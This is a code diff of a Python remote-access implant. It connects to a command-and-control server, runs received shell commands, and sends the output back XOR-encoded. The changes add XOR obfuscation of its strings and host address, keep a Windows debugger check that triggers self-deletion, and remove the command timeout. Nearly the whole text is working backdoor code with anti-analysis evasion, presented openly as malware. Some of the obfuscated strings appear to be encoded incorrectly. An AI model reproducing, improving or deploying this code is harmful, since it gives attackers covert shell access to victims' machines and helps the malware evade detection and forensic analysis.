@@ -1,78 +1,104 @@
 import socket
 import subprocess
 import base64
-import threading
 import os
 import sys
+import ctypes
+
+current_dir = os.path.abspath(os.getcwd())
+
+def obfuscate( data , key = 0x42 ):
+    '''
+    Perform XOR based obfuscation given data and key
+    '''
+    return ''.join( chr( ord( char ) ^ key ) for char in data )
+
+#Obfuscate the status strings
+STR_SELF_DESTRUCT = "1'.$o&'1607!6" #bitwise XOR of msg - "self-destruct" with 0x42
+STR_DEBUGGER_DETECTED = "\x06' 7%%'0b&'6'!6'&nb+,+6+#6+,%b1'.$o&'1607!6l" #bitwise XOR of msg - "debugger detected" with 0x42
+STR_SELF_DESTRUCT_INITIATED = "\x11'.$o&'1607!6b1'37',!'b+,+6+#6'&l" #bitwise XOR of msg - "Self-destruct sequence initiated." with 0x42
+STR_SELF_DESTRUCT_FAILED = "\x11'.$b&'1607!6b$#+.'&" #bitwise XOR of msg - "Self-destruct failed" with 0x42
+STR_COMMAND_RECEIVED = "\x10'!'+4'&b!-//#,&" #bitwise XOR of msg - "Received command" with 0x42
+STR_SENDING_OUTPUT = "\x11',&+,%b-76276" #bitwise XOR of msg - "Sending output" with 0x42
+STR_CONNECTED_TO_SERVER = "\x01-,,'!6'&b6-b\x01pb1'04'0" #bitwise XOR of msg - "Connected to C2 server" with 0x42
+STR_COMMAND_TOOK_LONG = "\x01-//#,&b6--)b6--b.-,%b6-b':'!76'" #bitwise XOR of msg - "Command took too long to execute" with 0x42
+STR_HOST = "spulrlrls" #bitwise XOR of 127.0.0.1
+
 
 def is_debugger_present():
-    # This is a simple and basic check, might not detect all debuggers
+    '''
+    Check if the code is being run under debugger in Windows target machine
+    '''
     try:
-        import ctypes
         return ctypes.windll.kernel32.IsDebuggerPresent() != 0
     except AttributeError:
         return False
 
-def execute_command(cmd):
-    def target():
-        try:
-            # Directly run the command without timeout parameter in subprocess
-            nonlocal output
-            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
-        except subprocess.CalledProcessError as e:
-            output = str(e.output)
-    
-    output = "Command took too long to execute"
-    thread = threading.Thread(target=target)
-    thread.start()
+def execute_command( cmd ):
+    '''
+    Execute the given command line instruction
+    '''
+    global current_dir
+    try:
+        if cmd.startswith( "cd " ): # special logic for cd instructions
+            os.chdir( os.path.join(current_dir, cmd[3:]) )
+            current_dir = os.path.abspath( os.getcwd() )
+            return "Changed directory to " + current_dir
+        else:
+            process = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE,
+            cwd = current_dir)
+            output, error = process.communicate()
+            return output.decode() + error.decode()
+    except Exception as e:
+        return str( e )
 
-    # Wait for the command to complete or timeout after 10 seconds
-    thread.join(timeout=10)
-    if thread.is_alive():
-        thread.join()  # Ensure cleanup if still running
-    return output
-
-def send_all(sock, data):
-    xor_encoded_data = ''.join(chr(ord(c) ^ 0x20) for c in data)
-    data_length = str(len(xor_encoded_data)).zfill(10)
-    sock.send(data_length.encode() + xor_encoded_data.encode())
+def send_all( sock , data ):
+    '''
+    Send result to C2 server
+    '''
+    xor_encoded_data = obfuscate( data , key = 0x20 )
+    data_length = str( len( xor_encoded_data ) ).zfill( 10 )
+    sock.send( data_length.encode() + xor_encoded_data.encode() )
 
 def self_destruct():
-    # Add cleanup actions here (e.g., delete files, clear logs)
-    print("Self-destruct sequence initiated.")
+    '''
+    Destroy the file in which this function resides
+    '''
+    print( STR_SELF_DESTRUCT_INITIATED )
     try:
-        # Attempt to delete the executable
-        os.remove(sys.argv[0])
+        os.remove( sys.argv[0] )
     except Exception as e:
-        print(f"Failed to self-destruct: {e}")
+        print( STR_SELF_DESTRUCT_FAILED )
     finally:
         sys.exit()
 
 def main():
-    host = '127.0.0.1'
+    '''
+    Main entry function for implant
+    '''
+    host = obfuscate( STR_HOST , key = 0x42 )
     port = 9999
-    
     if is_debugger_present():
-        print("Debugger detected, initiating self-destruct.")
+        print( STR_DEBUGGER_DETECTED )
         self_destruct()
 
     with socket.socket() as s:
-        s.connect((host, port))
-        print("Connected to C2 server at {}:{}".format(host, port))
+        s.connect( ( host, port ) )
+        print( STR_CONNECTED_TO_SERVER )
         
         while True:
-            encoded_cmd = s.recv(4096).decode().strip()
+            encoded_cmd = s.recv( 4096 ).decode().strip()
             if not encoded_cmd:
                 break
 
-            cmd = base64.b64decode(encoded_cmd).decode()
-            if cmd == "self-destruct":
+            cmd = base64.b64decode( encoded_cmd ).decode()
+            if cmd == obfuscate( STR_SELF_DESTRUCT , 0x42):
                 self_destruct()
 
-            print("Received command:", cmd)
-            output = execute_command(cmd)
-            print("Sending output:", output)
-            send_all(s, output)
+            print( STR_COMMAND_RECEIVED )
+            output = execute_command( cmd )
+            print( STR_SENDING_OUTPUT )
+            send_all( s , output )
 
 if __name__ == '__main__':
     main()
